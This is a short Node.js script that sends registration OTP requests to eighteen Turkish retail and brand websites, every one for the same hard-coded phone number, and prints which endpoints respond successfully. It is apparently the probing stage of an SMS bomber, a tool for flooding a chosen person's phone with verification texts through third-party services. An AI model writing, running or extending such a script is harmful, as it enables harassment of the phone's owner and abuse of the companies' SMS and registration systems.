import axios from 'axios';
const ph = '5343622375';

const TEST = [
  { id: 'migros', url: 'https://www.migros.com.tr/rest/auth/register/send-otp', p: { phoneNumber: '90' + ph } },
  { id: 'starbucks', url: 'https://www.starbucks.com.tr/api/account/register/otp', p: { mobilePhone: ph } },
  { id: 'koton', url: 'https://www.koton.com/api/v1/auth/register/send-otp', p: { phoneNumber: ph, countryCode: '+90' } },
  { id: 'a101', url: 'https://www.a101.com.tr/api/v1/auth/register/send-otp', p: { phone: ph } },
  { id: 'sok', url: 'https://www.sokmarket.com.tr/api/v1/auth/register/sendOtp', p: { phone: ph } },
  { id: 'mediamarkt', url: 'https://www.mediamarkt.com.tr/api/v1/auth/register/send-otp', p: { phone: ph, email: 't@t.com' } },
  { id: 'teknosa', url: 'https://www.teknosa.com/api/v1/auth/register/sendOtp', p: { phone: ph } },
  { id: 'rossmann', url: 'https://www.rossmann.com.tr/api/v1/auth/register/send-otp', p: { phone: ph, email: 't@t.com' } },
  { id: 'decathlon', url: 'https://www.decathlon.com.tr/api/v1/auth/register/sendOtp', p: { phone: ph, email: 't@t.com' } },
  { id: 'gratis', url: 'https://www.gratis.com/api/v1/auth/register/sendOtp', p: { phone: ph } },
  { id: 'watsons', url: 'https://www.watsons.com.tr/api/v1/auth/register/send-otp', p: { phone: ph } },
  { id: 'flormar', url: 'https://www.flormar.com.tr/api/v1/auth/register/sendOtp', p: { phone: ph, email: 't@t.com' } },
  { id: 'zara', url: 'https://www.zara.com/tr/api/v1/auth/register/send-otp', p: { phone: '+90' + ph } },
  { id: 'mango', url: 'https://shop.mango.com/services/user/v1/register/send-otp', p: { phone: '+90' + ph, countryId: 'TR' } },
  { id: 'hm', url: 'https://www2.hm.com/tr_tr/api/customer/register/sendOtp', p: { phone: '+90' + ph, email: 't@t.com' } },
  { id: 'carrefour', url: 'https://www.carrefoursa.com/api/v1/auth/register/send-otp', p: { phone: ph } },
  { id: 'avon', url: 'https://www.avon.com.tr/api/v1/auth/register/sendOtp', p: { phone: ph, email: 't@t.com', name: 'Test' } },
  { id: 'farmasi', url: 'https://www.farmasi.com.tr/api/v1/auth/register/sendOtp', p: { phone: ph, email: 't@t.com' } },
];

console.log('Testing alternative endpoints...\n');
for (const t of TEST) {
  process.stdout.write(t.id.padEnd(16));
  try {
    const r = await axios.post(t.url, t.p, {
      timeout: 8000,
      headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json' },
      validateStatus: () => true,
    });
    const body = JSON.stringify(r.data).substring(0, 80);
    if (r.status >= 200 && r.status < 400) {
      console.log('✅ ' + r.status + ' ' + body);
    } else {
      console.log('  ' + r.status + ' ' + body);
    }
  } catch (e) {
    if (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND') console.log('❌ DNS/REFUSED');
    else if (e.code === 'ECONNABORTED') console.log('⏱ TIMEOUT');
    else console.log('  ERR ' + e.message.substring(0, 50));
  }
}
